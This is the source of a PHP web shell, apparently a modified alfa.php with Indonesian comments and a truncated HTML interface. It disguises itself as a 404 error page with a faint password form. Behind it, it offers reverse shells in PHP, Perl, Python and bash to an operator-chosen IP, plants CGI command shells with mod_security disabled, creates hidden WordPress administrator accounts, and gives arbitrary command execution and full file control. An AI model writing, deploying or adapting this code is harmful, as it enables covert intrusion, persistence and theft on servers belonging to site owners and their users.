<?php
// ================ LOGIN SYSTEM ================
session_start();

// Password hash untuk "FatahSigma" (bcrypt)
$valid_hash = '$2y$10$wg9lRJsLZgU0Dk0BRMowU.87PjIOMQiDSKNfHF3YcPFNabEPlF/Fm';

// Cek apakah sudah login
if (!isset($_SESSION['sigma_access'])) {
    // Cek form login
    if (isset($_POST['sigma_pass'])) {
        if (password_verify($_POST['sigma_pass'], $valid_hash)) {
            $_SESSION['sigma_access'] = true;
            header('Location: ' . $_SERVER['PHP_SELF']);
            exit;
        }
    }
    
    // Tampilkan halaman 404 palsu dengan form login
    http_response_code(404);
    $requested_url = $_SERVER['REQUEST_URI'] ?? '/';
    ?>
    <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
    <html>
    <head>
        <title>404 Not Found</title>
        <style>
            /* Hidden password form - samar di tengah bawah */
            .sigma-form {
                position: fixed;
                bottom: 20px;
                left: 50%;
                transform: translateX(-50%);
                opacity: 0.15;
                transition: opacity 0.3s ease;
                text-align: center;
                pointer-events: auto;
                z-index: 1000;
            }
            
            .sigma-form:hover {
                opacity: 0.4;
            }
            
            .sigma-form input {
                background: transparent;
                border: 1px solid #ccc;
                color: #333;
                padding: 6px 12px;
                font-size: 13px;
                font-family: 'Times New Roman', serif;
                width: 150px;
                border-radius: 0;
            }
            
            .sigma-form input:focus {
                outline: none;
                border-color: #666;
                background: rgba(255,255,255,0.1);
            }
            
            .sigma-form button {
                background: transparent;
                border: 1px solid #ccc;
                color: #333;
                padding: 6px 12px;
                font-size: 13px;
                font-family: 'Times New Roman', serif;
                cursor: pointer;
                margin-left: 5px;
            }
            
            .sigma-form button:hover {
                background: rgba(0,0,0,0.05);
            }
            
            /* Hint sangat samar di source code */
            .sigma-hint {
                display: none;
            }
            
            /* Style untuk pesan error */
            .error-msg {
                position: fixed;
                top: 50%;
                left: 50%;
                transform: translate(-50%, -50%);
                background: rgba(255,0,0,0.1);
                border: 1px solid #ff0000;
                color: #ff0000;
                padding: 5px 10px;
                font-size: 12px;
                font-family: monospace;
                opacity: 0.7;
            }
        </style>
    </head>
    <body>
        <h1>Not Found</h1>
        <p>The requested URL <?php echo htmlspecialchars($requested_url); ?> was not found on this server.</p>
        <p>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.</p>
        
        <!-- access pattern: /dev/shm/.sigma -->
        
        <!-- Hidden login form - samar di tengah bawah -->
        <form method="POST" class="sigma-form" autocomplete="off">
            <input type="password" name="sigma_pass" placeholder="••••••">
            <button type="submit">→</button>
        </form>
        
        <?php if (isset($_POST['sigma_pass'])): ?>
            <div class="error-msg">Access denied</div>
        <?php endif; ?>
        
        <script>
        (function() {
            const form = document.querySelector('.sigma-form');
            const input = form.querySelector('input');
            
            input.addEventListener('focus', function() {
                form.style.opacity = '0.8';
            });
            
            input.addEventListener('blur', function() {
                form.style.opacity = '0.15';
            });
        })();
        </script>
    </body>
    </html>
    <?php
    exit;
}

// ================ ORIGINAL ALFA.PHP ================
// [DI SINI KODE ALFA.PHP ASLI TANPA PERUBAHAN]
error_reporting(0);
ini_set('display_errors', 0);
set_time_limit(0);

function backConnect($type, $ip, $port) {
    $code = '';
    
    switch($type) {
        case 'php':
            $code = '<?php $sock=fsockopen("'.$ip.'",'.$port.');$proc=proc_open("/bin/sh -i", array(0=>$sock,1=>$sock,2=>$sock),$pipes);proc_close($proc);?>';
            eval($code);
            break;
        case 'perl':
            $code = 'perl -e \'use Socket;$i="'.$ip.'";$p='.$port.';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\'';
            shell_exec($code . ' 2>&1 &');
            break;
        case 'python':
            $code = 'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'.$ip.'",'.$port.'));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'';
            shell_exec($code . ' 2>&1 &');
            break;
        case 'bash':
            $code = 'bash -i >& /dev/tcp/'.$ip.'/'.$port.' 0>&1';
            shell_exec($code . ' 2>&1 &');
            break;
    }
    return true;
}

function createCGIShell($type, $base_path) {
    // Buat folder .SIGMA
    $sigma_folder = rtrim($base_path, '/') . '/.SIGMA';
    if (!is_dir($sigma_folder)) {
        mkdir($sigma_folder, 0755, true);
    }
    
    // Buat .htaccess
    $htaccess = $sigma_folder . '/.htaccess';
    $htaccess_content = 'Options +ExecCGI
AddHandler cgi-script .cgi
DirectoryIndex index.html

# Allow access from anywhere
Order allow,deny
Allow from all

# Disable security for CGI
<IfModule mod_security.c>
    SecFilterEngine Off
    SecFilterScanPOST Off
</IfModule>

# Set proper permissions
<FilesMatch "\.cgi$">
    SetHandler cgi-script
    Options +ExecCGI
</FilesMatch>';
    file_put_contents($htaccess, $htaccess_content);
    
    $content = '';
    $filename = '';
    
    if ($type == 'perl') {
        $filename = 'perl.cgi';
        $content = '#!/usr/bin/perl
use strict;
use warnings;
print "Content-type: text/html\n\n";
print "<!DOCTYPE html><html><head><title>Perl CGI Shell</title>";
print "<style>body{background:#1e1e2f;color:#e0e0e0;font-family:monospace;padding:20px;}";
print "input{background:#2d2d3a;color:#fff;border:1px solid #4a9eff;padding:8px;width:70%;font-family:monospace;}";
print "button{background:#4a9eff;color:#fff;border:none;padding:8px 20px;cursor:pointer;font-weight:bold;}";
print "pre{background:#252532;padding:15px;border-radius:5px;border-left:4px solid #7502FF;}</style></head><body>";
print "<h2>Perl CGI Shell</h2>";
print "<form method=\'GET\'><input type=\'text\' name=\'cmd\' placeholder=\'Enter command...\' autofocus> ";
print "<button type=\'submit\'>Execute</button></form>";
print "<hr><pre>";

my $cmd = $ENV{\'QUERY_STRING\'};
$cmd =~ s/%([a-fA-F0-9][a-fA-F0-9])/pack("C", hex($1))/eg;
$cmd =~ s/\+/ /g;
$cmd =~ s/&cmd=//;
if ($cmd) {
    my $output = `$cmd 2>&1`;
    $output =~ s/</&lt;/g;
    $output =~ s/>/&gt;/g;
    print $output;
}
print "</pre></body></html>";
';
    } elseif ($type == 'python') {
        $filename = 'python.cgi';
        $content = '#!/usr/bin/python
import os
import cgi
print "Content-type: text/html\\n"
print "<!DOCTYPE html><html><head><title>Python CGI Shell</title>"
print "<style>body{background:#1e1e2f;color:#e0e0e0;font-family:monospace;padding:20px;}"
print "input{background:#2d2d3a;color:#fff;border:1px solid #4a9eff;padding:8px;width:70%;font-family:monospace;}"
print "button{background:#4a9eff;color:#fff;border:none;padding:8px 20px;cursor:pointer;font-weight:bold;}"
print "pre{background:#252532;padding:15px;border-radius:5px;border-left:4px solid #7502FF;}</style></head><body>"
print "<h2>Python CGI Shell</h2>"
print "<form method=\'GET\'><input type=\'text\' name=\'cmd\' placeholder=\'Enter command...\' autofocus> "
print "<button type=\'submit\'>Execute</button></form>"
print "<hr><pre>"

fs = cgi.FieldStorage()
cmd = fs.getvalue("cmd", "")
if cmd:
    output = os.popen(cmd).read()
    print output.replace("<", "&lt;").replace(">", "&gt;")
print "</pre></body></html>"
';
    } elseif ($type == 'bash') {
        $filename = 'bash.cgi';
        $content = '#!/bin/bash
echo "Content-type: text/html"
echo ""
echo "<!DOCTYPE html><html><head><title>Bash CGI Shell</title>"
echo "<style>body{background:#1e1e2f;color:#e0e0e0;font-family:monospace;padding:20px;}"
echo "input{background:#2d2d3a;color:#fff;border:1px solid #4a9eff;padding:8px;width:70%;font-family:monospace;}"
echo "button{background:#4a9eff;color:#fff;border:none;padding:8px 20px;cursor:pointer;font-weight:bold;}"
echo "pre{background:#252532;padding:15px;border-radius:5px;border-left:4px solid #7502FF;}</style></head><body>"
echo "<h2>Bash CGI Shell</h2>"
echo "<form method=\'GET\'><input type=\'text\' name=\'cmd\' placeholder=\'Enter command...\' autofocus> "
echo "<button type=\'submit\'>Execute</button></form>"
echo "<hr><pre>"

QUERY_STRING="$QUERY_STRING"
cmd=$(echo "$QUERY_STRING" | sed "s/&cmd=//g" | sed "s/%20/ /g" | sed "s/%2F/\//g")
if [ -n "$cmd" ]; then
    eval "$cmd" 2>&1
fi
echo "</pre></body></html>"
';
    }
    
    if ($content && $filename) {
        $fullpath = $sigma_folder . '/' . $filename;
        if (file_put_contents($fullpath, $content)) {
            chmod($fullpath, 0755);
            return ['path' => $fullpath, 'url' => $filename];
        }
    }
    return false;
}



function wpAddAdmin($path, $username, $password, $email) {
    $wp_load = rtrim($path, '/') . '/wp-load.php';
    
    if (!file_exists($wp_load)) {
        return ['success' => false, 'message' => 'wp-load.php not found at: ' . $wp_load];
    }
    
    // Include WordPress
    try {
        ob_start();
        define('WP_USE_THEMES', false);
        define('SHORTINIT', false);
        require_once($wp_load);
        ob_end_clean();
    } catch (Exception $e) {
        return ['success' => false, 'message' => 'Error loading WordPress: ' . $e->getMessage()];
    }
    
    // Check if WordPress functions are available
    if (!function_exists('wp_insert_user')) {
        return ['success' => false, 'message' => 'WordPress functions not available (wp_insert_user missing)'];
    }
    
    // Check if user exists
    $user_id = username_exists($username);
    if ($user_id) {
        return ['success' => false, 'message' => 'Username already exists'];
    }
    
    if (email_exists($email)) {
        return ['success' => false, 'message' => 'Email already exists'];
    }
    
    // Create user
    $user_id = wp_insert_user([
        'user_login' => $username,
        'user_pass' => $password,
        'user_email' => $email,
        'user_registered' => date('Y-m-d H:i:s'),
        'role' => 'administrator',
        'display_name' => $username,
        'nickname' => $username
    ]);
    
    if (is_wp_error($user_id)) {
        return ['success' => false, 'message' => 'Error: ' . $user_id->get_error_message()];
    }
    
    // Ensure user is admin
    $user = new WP_User($user_id);
    $user->set_role('administrator');
    
    return ['success' => true, 'message' => "Admin user '$username' created successfully (ID: $user_id)"];
}

function scanWordPress($path) {
    $sites = [];
    if (is_dir($path)) {
        $items = scandir($path);
        foreach ($items as $item) {
            if ($item == '.' || $item == '..') continue;
            $full_path = $path . '/' . $item;
            if (is_dir($full_path)) {
                // Cek di dalam folder
                if (file_exists($full_path . '/wp-load.php')) {
                    $sites[] = $full_path;
                }
            } else {
                // Cek di current directory
                if ($item == 'wp-load.php') {
                    $sites[] = $path;
                }
            }
        }
        // Cek current directory juga
        if (file_exists($path . '/wp-load.php')) {
            if (!in_array($path, $sites)) {
                $sites[] = $path;
            }
        }
    }
    return array_unique($sites);
}


// FUNGSI FILE MANAGER

function listDir($dir) {
    $items = [];
    if ($dh = @opendir($dir)) {
        while (($file = readdir($dh)) !== false) {
            if ($file != '.' && $file != '..') {
                $path = rtrim($dir, '/') . '/' . $file;
                $items[] = [
                    'name' => $file,
                    'path' => $path,
                    'type' => is_dir($path) ? 'dir' : 'file',
                    'size' => is_file($path) ? filesize($path) : 0,
                    'mtime' => filemtime($path),
                    'perms' => substr(sprintf('%o', fileperms($path)), -4),
                    'owner' => function_exists('posix_getpwuid') ? posix_getpwuid(fileowner($path))['name'] ?? '?' : '?',
                    'group' => function_exists('posix_getgrgid') ? posix_getgrgid(filegroup($path))['name'] ?? '?' : '?'
                ];
            }
        }
        closedir($dh);
    }
    usort($items, function($a, $b) {
        if ($a['type'] == $b['type']) return strcasecmp($a['name'], $b['name']);
        return $a['type'] == 'dir' ? -1 : 1;
    });
    return $items;
}

function formatSize($bytes) {
    if ($bytes >= 1073741824) return number_format($bytes / 1073741824, 2) . ' GB';
    if ($bytes >= 1048576) return number_format($bytes / 1048576, 2) . ' MB';
    if ($bytes >= 1024) return number_format($bytes / 1024, 2) . ' KB';
    return $bytes . ' B';
}

function getSystemInfo() {
    $info = [];
    $info['kernel'] = php_uname('s') . ' ' . php_uname('r');
    $info['hostname'] = php_uname('n');
    $info['user'] = get_current_user() . ' (UID: ' . (function_exists('getmyuid') ? getmyuid() : '?') . ')';
    $info['disabled'] = ini_get('disable_functions') ?: 'None';
    $info['phpver'] = phpversion();
    $info['server_ip'] = $_SERVER['SERVER_ADDR'] ?? 'Unknown';
    $info['client_ip'] = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
    $info['software'] = $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown';
    return $info;
}


// AJAX HANDLERS

if (isset($_SERVER['HTTP_X_REQUESTED_WITH']) && $_SERVER['HTTP_X_REQUESTED_WITH'] == 'XMLHttpRequest') {
    header('Content-Type: application/json');
    
    if (isset($_POST['action'])) {
        $response = ['success' => false, 'message' => '', 'data' => null];
        
        switch ($_POST['action']) {
            case 'list':
                $dir = $_POST['dir'] ?? '.';
                $items = listDir($dir);
                $response['success'] = true;
                $response['data'] = $items;
                break;
                
            case 'rename':
                $old = $_POST['old'] ?? '';
                $new = $_POST['new'] ?? '';
                if ($old && $new && file_exists($old) && rename($old, $new)) {
                    $response['success'] = true;
                    $response['message'] = 'Renamed successfully';
                }
                break;
                
            case 'delete':
                $path = $_POST['path'] ?? '';
                if ($path && file_exists($path)) {
                    if (is_dir($path)) {
                        $success = true;
                        $it = new RecursiveIteratorIterator(
                            new RecursiveDirectoryIterator($path, RecursiveDirectoryIterator::SKIP_DOTS),
                            RecursiveIteratorIterator::CHILD_FIRST
                        );
                        foreach ($it as $f) {
                            if ($f->isDir()) $success = @rmdir($f->getRealPath()) && $success;
                            else $success = @unlink($f->getRealPath()) && $success;
                        }
                        $success = @rmdir($path) && $success;
                        $response['success'] = $success;
                        $response['message'] = $success ? 'Deleted' : 'Delete failed';
                    } else {
                        if (@unlink($path)) {
                            $response['success'] = true;
                            $response['message'] = 'Deleted';
                        }
                    }
                }
                break;
                
            case 'save':
                $file = $_POST['file'] ?? '';
                $content = $_POST['content'] ?? '';
                if ($file && file_put_contents($file, $content) !== false) {
                    $response['success'] = true;
                    $response['message'] = 'Saved';
                }
                break;
                
            case 'chmod':
                $path = $_POST['path'] ?? '';
                $perms = $_POST['perms'] ?? '';
                if ($path && $perms && chmod($path, octdec($perms))) {
                    $response['success'] = true;
                    $response['message'] = 'Permissions changed';
                }
                break;
                
            case 'mkdir':
                $dir = $_POST['dir'] ?? '';
                if ($dir && !file_exists($dir) && mkdir($dir, 0755, true)) {
                    $response['success'] = true;
                    $response['message'] = 'Directory created';
                }
                break;
                
            case 'mkfile':
                $file = $_POST['file'] ?? '';
                $content = $_POST['content'] ?? '';
                if ($file && file_put_contents($file, $content) !== false) {
                    $response['success'] = true;
                    $response['message'] = 'File created';
                }
                break;
                
            case 'upload':
                if (isset($_FILES['file'])) {
                    $target = $_POST['path'] . '/' . basename($_FILES['file']['name']);
                    if (move_uploaded_file($_FILES['file']['tmp_name'], $target)) {
                        $response['success'] = true;
                        $response['message'] = 'Uploaded';
                    }
                }
                break;
                
            case 'read':
                $file = $_POST['file'] ?? '';
                if ($file && file_exists($file) && is_file($file)) {
                    $response['success'] = true;
                    $response['data'] = file_get_contents($file);
                }
                break;
                
            case 'cmd':
                $cmd = $_POST['cmd'] ?? '';
                $cwd = $_POST['cwd'] ?? '';
                
                if ($cmd) {
                    $fullcmd = "cd " . escapeshellarg($cwd) . " && " . $cmd . " 2>&1";
                    $output = '';
                    
                    if (function_exists('shell_exec')) {
                        $output = shell_exec($fullcmd);
                    } elseif (function_exists('exec')) {
                        exec($fullcmd, $out);
                        $output = implode("\n", $out);
                    } elseif (function_exists('system')) {
                        ob_start();
                        system($fullcmd);
                        $output = ob_get_clean();
                    } elseif (function_exists('passthru')) {
                        ob_start();
                        passthru($fullcmd);
                        $output = ob_get_clean();
                    } elseif (is_resource($proc = popen($fullcmd, 'r'))) {
                        $output = fread($proc, 2097152);
                        pclose($proc);
                    }
                    
                    $response['success'] = true;
                    $response['data'] = $output ?: 'No output';
                }
                break;
                
            case 'backconnect':
                $type = $_POST['type'] ?? 'php';
                $ip = $_POST['ip'] ?? '';
                $port = $_POST['port'] ?? '';
                
                if ($ip && $port) {
                    backConnect($type, $ip, $port);
                    $response['success'] = true;
                    $response['message'] = "Backconnect sent to $ip:$port using $type";
                }
                break;
                
            case 'cgi':
                $type = $_POST['cgi_type'] ?? '';
                $path = $_POST['cgi_path'] ?? '';
                $result = createCGIShell($type, $path);
                if ($result) {
                    $response['success'] = true;
                    $response['message'] = 'CGI shell created in .SIGMA folder';
                    $response['path'] = $result['path'];
                    $response['url'] = $result['url'];
                    $response['folder'] = '.SIGMA';
                    $base_url = (isset($_SERVER['HTTPS']) ? 'https://' : 'http://') . $_SERVER['HTTP_HOST'] . dirname($_SERVER['PHP_SELF']);
                    $response['full_url'] = $base_url . '/.SIGMA/' . $result['url'];
                } else {
                    $response['message'] = 'Failed to create CGI shell';
                }
                break;
                
            case 'wp_scan':
                $path = $_POST['path'] ?? '.';
                $sites = scanWordPress($path);
                $response['success'] = true;
                $response['sites'] = $sites;
                $response['count'] = count($sites);
                break;
                
            case 'wp_add':
                $path = $_POST['wp_path'] ?? '';
                $user = $_POST['username'] ?? '';
                $pass = $_POST['password'] ?? '';
                $email = $_POST['email'] ?? '';
                
                if ($path && $user && $pass && $email) {
                    $response = wpAddAdmin($path, $user, $pass, $email);
                } else {
                    $response['message'] = 'All fields required';
                }
                break;
        }
        
        echo json_encode($response);
        exit;
    }
}


// MAIN SHELL - TEMA ALFA

$cwd = isset($_GET['dir']) ? $_GET['dir'] : '.';
$cwd = realpath($cwd) ?: realpath('.');
if (!$cwd) $cwd = '/';
if ($cwd[strlen($cwd)-1] != '/') $cwd .= '/';

$sys_info = getSystemInfo();
?>
<!DOCTYPE html>
<html>
<head>
    <title>sigma shell</title>
    <meta charset="UTF-8">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #1e1e2f;
            color: #e0e0e0;
            padding: 20px;
        }
        
        .container {
            max-width: 1400px;
            margin: 0 auto;
            background: #2d2d3a;
            border-radius: 12px;
            padding: 25px;
            box-shadow: 0 8px 30px rgba(0,0,0,0.3);
        }
        
        /* System Info */
        .sys-info {
            background: #252532;
            border-radius: 10px;
            padding: 20px;
            margin-bottom: 25px;
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 15px;
            border: 1px solid #3a3a4a;
        }
        
        .info-item {
            padding: 10px;
            background: #1e1e2b;
            border-radius: 8px;
            border-left: 3px solid #4a9eff;
        }
        
        .info-label {
            font-size: 12px;
            color: #8a8fa0;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            margin-bottom: 5px;
        }
        
        .info-value {
            font-size: 14px;
            color: #fff;
            font-weight: 500;
            word-break: break-all;
        }
        
        .info-value a {
            color: #4a9eff;
            text-decoration: none;
        }
        
        .info-value a:hover {
            text-decoration: underline;
        }
        
        /* Header */
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
            padding-bottom: 15px;
            border-bottom: 1px solid #3a3a4a;
        }
        
        .header h1 {
            font-size: 24px;
            font-weight: 600;
            color: #fff;
        }
        
        .header h1 span {
            color: #4a9eff;
            font-size: 14px;
            margin-left: 10px;
            font-weight: normal;
        }
        
        /* Menu Tabs */
        .menu-tabs {
            display: flex;
            gap: 2px;
            margin-bottom: 20px;
            background: #252532;
            padding: 10px;
            border-radius: 8px;
            border: 1px solid #3a3a4a;
        }
        
        .tab-btn {
            padding: 10px 20px;
            background: #3a3a4a;
            color: #8a8fa0;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            font-size: 14px;
            font-weight: 500;
            transition: all 0.2s;
        }
        
        .tab-btn:hover {
            background: #4a9eff;
            color: #fff;
        }
        
        .tab-btn.active {
            background: #4a9eff;
            color: #fff;
        }
        
        /* Path */
        .path {
            background: #252532;
            padding: 12px 18px;
            border-radius: 8px;
            margin-bottom: 20px;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            border: 1px solid #3a3a4a;
            display: flex;
            align-items: center;
            gap: 10px;
            flex-wrap: wrap;
        }
        
        .path a {
            color: #4a9eff;
            text-decoration: none;
        }
        
        .path a:hover {
            text-decoration: underline;
        }
        
        /* Action Buttons */
        .actions {
            display: flex;
            gap: 10px;
            margin-bottom: 20px;
            flex-wrap: wrap;
        }
        
        .btn {
            padding: 10px 18px;
            background: #3a3a4a;
            color: #fff;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            font-size: 14px;
            font-weight: 500;
            transition: all 0.2s;
            display: inline-flex;
            align-items: center;
            gap: 5px;
        }
        
        .btn:hover {
            background: #4a4a5a;
            transform: translateY(-1px);
        }
        
        .btn-primary { background: #4a9eff; }
        .btn-primary:hover { background: #6aafff; }
        .btn-success { background: #2ecc71; }
        .btn-success:hover { background: #27ae60; }
        .btn-danger { background: #e74c3c; }
        .btn-danger:hover { background: #c0392b; }
        .btn-warning { background: #f39c12; }
        .btn-warning:hover { background: #e67e22; }
        
        /* Tools Grid */
        .tools-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
            gap: 20px;
            margin-bottom: 25px;
        }
        
        .tool-card {
            background: #252532;
            border-radius: 10px;
            border: 1px solid #3a3a4a;
            overflow: hidden;
        }
        
        .tool-header {
            background: #1e1e2b;
            padding: 15px 20px;
            font-weight: 600;
            color: #4a9eff;
            border-bottom: 1px solid #3a3a4a;
            cursor: pointer;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .tool-header:hover {
            background: #2a2a38;
        }
        
        .tool-header .toggle-icon {
            transition: transform 0.3s;
            font-size: 12px;
            color: #8a8fa0;
        }
        
        .tool-header.collapsed .toggle-icon {
            transform: rotate(-90deg);
        }
        
        .tool-body {
            padding: 20px;
            transition: all 0.3s;
        }
        
        .tool-body.collapsed {
            display: none;
        }
        
        .tool-body input, .tool-body select, .tool-body textarea {
            width: 100%;
            padding: 10px 12px;
            margin-bottom: 12px;
            background: #1e1e2b;
            border: 1px solid #3a3a4a;
            border-radius: 6px;
            color: #fff;
            font-size: 14px;
        }
        
        .tool-body input:focus, .tool-body select:focus, .tool-body textarea:focus {
            outline: none;
            border-color: #4a9eff;
        }
        
        .tool-body label {
            display: block;
            margin-bottom: 5px;
            color: #8a8fa0;
            font-size: 13px;
        }
        
        .tool-row {
            display: flex;
            gap: 10px;
            margin-bottom: 12px;
        }
        
        .tool-row input {
            flex: 1;
            margin-bottom: 0;
        }
        
        /* File Table - Compact dan Estetik */
        .file-table {
            width: 100%;
            border-collapse: collapse;
            margin-bottom: 20px;
            font-size: 13px;
        }
        
        .file-table th {
            background: #252532;
            padding: 10px 6px;
            text-align: left;
            font-weight: 600;
            color: #8a8fa0;
            border-bottom: 2px solid #3a3a4a;
            font-size: 12px;
            white-space: nowrap;
        }
        
        .file-table td {
            padding: 8px 6px;
            border-bottom: 1px solid #3a3a4a;
            white-space: nowrap;
        }
        
        .file-table tr:hover {
            background: #323240;
        }
        
        .file-table .dir {
            color: #4a9eff;
            font-weight: 500;
        }
        
        .file-table .file {
            color: #e0e0e0;
        }
        
        .perms {
            font-family: 'Courier New', monospace;
            color: #8a8fa0;
            letter-spacing: 0.5px;
        }
        
        .size {
            font-family: 'Courier New', monospace;
            color: #8a8fa0;
            text-align: right;
            padding-right: 10px;
        }
        
        .actions-cell {
            display: flex;
            gap: 2px;
            flex-wrap: nowrap;
        }
        
        .action-btn {
            padding: 3px 6px;
            font-size: 10px;
            border-radius: 3px;
            background: #3a3a4a;
            color: #fff;
            border: none;
            cursor: pointer;
            transition: all 0.2s;
            min-width: 32px;
            text-align: center;
        }
        
        .action-btn:hover { background: #4a4a5a; }
        .action-btn.edit { background: #f39c12; }
        .action-btn.download { background: #3498db; }
        .action-btn.rename { background: #95a5a6; }
        .action-btn.perms { background: #9b59b6; }
        .action-btn.delete { background: #e74c3c; }
        
        /* Shell Section */
        .shell-section {
            background: #252532;
            border-radius: 10px;
            margin-top: 25px;
            border: 1px solid #3a3a4a;
            overflow: hidden;
        }
        
        .shell-header {
            background: #1e1e2b;
            padding: 15px 20px;
            font-weight: 600;
            color: #4a9eff;
            border-bottom: 1px solid #3a3a4a;
        }
        
        .shell-input {
            display: flex;
            padding: 15px;
            background: #2d2d3a;
            gap: 10px;
        }
        
        .shell-input input {
            flex: 1;
            padding: 12px 15px;
            background: #1e1e2b;
            border: 1px solid #3a3a4a;
            border-radius: 6px;
            color: #fff;
            font-family: 'Courier New', monospace;
            font-size: 14px;
        }
        
        .shell-input input:focus {
            outline: none;
            border-color: #4a9eff;
        }
        
        .shell-output {
            background: #1a1a25;
            color: #00ff00;
            padding: 15px;
            font-family: 'Courier New', monospace;
            font-size: 13px;
            white-space: pre-wrap;
            word-break: break-all;
            max-height: 300px;
            overflow-y: auto;
            border-top: 1px solid #3a3a4a;
        }
        
        /* Modal */
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.8);
            z-index: 1000;
            backdrop-filter: blur(5px);
        }
        
        .modal-content {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: #2d2d3a;
            padding: 30px;
            border-radius: 12px;
            min-width: 400px;
            max-width: 90%;
            max-height: 90vh;
            overflow-y: auto;
            box-shadow: 0 20px 60px rgba(0,0,0,0.5);
            border: 1px solid #4a4a5a;
        }
        
        .modal-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
            padding-bottom: 10px;
            border-bottom: 1px solid #3a3a4a;
        }
        
        .modal-header h3 {
            color: #fff;
            font-size: 18px;
        }
        
        .close {
            color: #8a8fa0;
            font-size: 24px;
            cursor: pointer;
            transition: color 0.2s;
        }
        
        .close:hover {
            color: #fff;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        .form-group label {
            display: block;
            margin-bottom: 8px;
            color: #8a8fa0;
            font-size: 13px;
            font-weight: 500;
        }
        
        .form-group input,
        .form-group textarea,
        .form-group select {
            width: 100%;
            padding: 10px 12px;
            background: #1e1e2b;
            border: 1px solid #3a3a4a;
            border-radius: 6px;
            color: #fff;
            font-size: 14px;
        }
        
        .form-group input:focus,
        .form-group textarea:focus,
        .form-group select:focus {
            outline: none;
            border-color: #4a9eff;
        }
        
        .form-group textarea {
            min-height: 300px;
            font-family: 'Courier New', monospace;
            resize: vertical;
        }
        
        .modal-footer {
            display: flex;
            gap: 10px;
            justify-content: flex-end;
            margin-top: 20px;
        }
        
        /* Iframe untuk CGI Shell */
        .cgi-iframe {
            width: 100%;
            height: 500px;
            border: 2px solid #3a3a4a;
            border-radius: 8px;
            background: #1e1e2f;
            margin-top: 15px;
        }
        
        /* Alert */
        .alert {
            position: fixed;
            top: 20px;
            right: 20px;
            padding: 15px 25px;
            background: #2d2d3a;
            border-left: 4px solid #4a9eff;
            border-radius: 6px;
            color: #fff;
            box-shadow: 0 5px 20px rgba(0,0,0,0.3);
            z-index: 2000;
            animation: slideIn 0.3s ease;
        }
        
        .alert.success { border-left-color: #2ecc71; }
        .alert.error { border-left-color: #e74c3c; }
        
        @keyframes slideIn {
            from { transform: translateX(100%); opacity: 0; }
            to { transform: translateX(0); opacity: 1; }
        }
        
        .hidden { display: none; }
        
        /* Loading Spinner */
        .spinner {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 2px solid #3a3a4a;
            border-top-color: #4a9eff;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-right: 10px;
            vertical-align: middle;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        
        /* Scrollbar */
        ::-webkit-scrollbar { width: 8px; height: 8px; }
        ::-webkit-scrollbar-track { background: #1e1e2b; border-radius: 8px; }
        ::-webkit-scrollbar-thumb { background: #3a3a4a; border-radius: 8px; }
        ::-webkit-scrollbar-thumb:hover { background: #4a4a5a; }
    </style>
</head>
<body>
<div class="container">
    <!-- System Info -->
    <div class="sys-info">
        <div class="info-item">
            <div class="info-label">Kernel</div>
            <div class="info-value"><?php echo htmlspecialchars($sys_info['kernel']); ?></div>
        </div>
        <div class="info-item">
            <div class="info-label">User</div>
            <div class="info-value"><?php echo htmlspecialchars($sys_info['user']); ?></div>
        </div>
        <div class="info-item">
            <div class="info-label">Disabled Functions</div>
            <div class="info-value"><?php echo htmlspecialchars($sys_info['disabled']); ?></div>
        </div>
        <div class="info-item">
            <div class="info-label">PHP Version</div>
            <div class="info-value"><?php echo htmlspecialchars($sys_info['phpver']); ?></div>
        </div>
        <div class="info-item">
            <div class="info-label">Server IP</div>
            <div class="info-value"><?php echo htmlspecialchars($sys_info['server_ip']); ?></div>
        </div>
        <div class="info-item">
            <div class="info-label">Your IP</div>
            <div class="info-value"><?php echo htmlspecialchars($sys_info['client_ip']); ?></div>
        </div>
        <div class="info-item">
            <div class="info-label">Software</div>
            <div class="info-value"><?php echo htmlspecialchars($sys_info['software']); ?></div>
        </div>
    </div>

    <!-- Header -->
    <div class="header">
        <h1>zev2 shell <span>v2.0</span></h1>
    </div>

    <!-- Menu Tabs -->
    <div class="menu-tabs">
        <button class="tab-btn active" onclick="showTab('files')">File Manager</button>
        <button class="tab-btn" onclick="showTab('backconnect')">Back Connect</button>
        <button class="tab-btn" onclick="showTab('cgi')">CGI Shell</button>
        <button class="tab-btn" onclick="showTab('wordpress')">WordPress</button>
    </div>

    <!-- Tab: File Manager -->
    <div id="tab-files" class="tab-content">
        <div class="path" id="currentPath">
            <?php
            $parts = explode('/', trim($cwd, '/'));
            $path = '';
            echo '<a href="#" onclick="changeDir(\'/\')">~</a>';
            foreach ($parts as $p) {
                if ($p) {
                    $path .= '/' . $p;
                    echo ' / <a href="#" onclick="changeDir(\'' . htmlspecialchars($path) . '\')">' . htmlspecialchars($p) . '</a>';
                }
            }
            ?>
        </div>

        <div class="actions">
            <button onclick="showModal('upload')" class="btn btn-primary">Upload</button>
